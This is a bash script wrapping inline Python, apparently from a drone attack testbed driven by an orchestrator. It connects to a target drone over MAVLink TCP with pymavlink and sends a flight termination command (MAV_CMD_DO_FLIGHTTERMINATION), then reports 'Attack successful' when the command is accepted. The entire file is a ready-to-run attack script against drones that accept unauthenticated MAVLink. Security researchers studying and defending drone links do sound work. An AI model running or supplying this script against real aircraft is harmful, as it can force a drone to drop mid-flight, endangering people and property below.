#!/usr/bin/env bash
# Auto-generated from: Flight-Termination.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# Flight Termination은 MAVLink TCP (5760) 연결을 가정합니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
  DRONE_MAVLINK_TCP)
    TARGET_PORT="${TARGET_PORT:-5760}" # 기본 MAVLink TCP 포트
    ;;
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 일반 MAVLink UDP 포트 (예비)
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=flight-termination src=Flight-Termination.md"
log "[BLOCK 1] type=python (Inline Flight Termination Command)"

# MAV_CMD_DO_FLIGHTTERMINATION 명령 전송을 위한 Python 인라인 스크립트 실행
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os, sys
from pymavlink import mavutil
import time

# 인수가 누락되었을 경우 환경 변수 fallback
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

# 인수를 IP, Port로 파싱
try:
    target_ip, target_port_str = sys.argv[1].split(':', 1)
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)

def connect_drone(ip: str, port: int):
    # MAVLink TCP 연결을 시도
    master = mavutil.mavlink_connection(f'tcp:{ip}:{port}')
    master.wait_heartbeat()
    print(f"[INFO] Connected to the drone at tcp:{ip}:{port}.")
    return master

def execute_flight_termination(master):
    # MAV_CMD_DO_FLIGHTTERMINATION 명령 전송 (param1=1: 활성화)
    master.mav.command_long_send(
        master.target_system,
        master.target_component,
        mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
        0, # confirmation
        1, 0, 0, 0, 0, 0, 0
    )
    print("[>] Flight termination command sent.")

def main(target_ip, target_port):
    try:
        master = connect_drone(target_ip, target_port)
    except Exception as e:
        print(f"[ERROR] Failed to connect to drone: {e}", file=sys.stderr)
        return

    execute_flight_termination(master)

    start_time = time.time()
    TIMEOUT = 5 # ACK 응답을 5초 동안 기다림

    while time.time() - start_time < TIMEOUT:
        # COMMAND_ACK 메시지를 기다림
        msg = master.recv_match(type=['COMMAND_ACK'], blocking=True, timeout=0.1)
        if msg is None:
            continue
            
        if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
            if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                print("[INFO] Flight termination command accepted. Attack successful.")
            else:
                print(f"[WARNING] Flight termination command failed: Result {msg.result}")
            return
    
    print("[INFO] Command sent, but no COMMAND_ACK received within 5 seconds.")


if __name__ == "__main__":
    main(target_ip, target_port)
PY

log "[BLOCK 2] type=control (Execution Complete)"
log "Command sent; orchestrator should wait for the Python script to exit."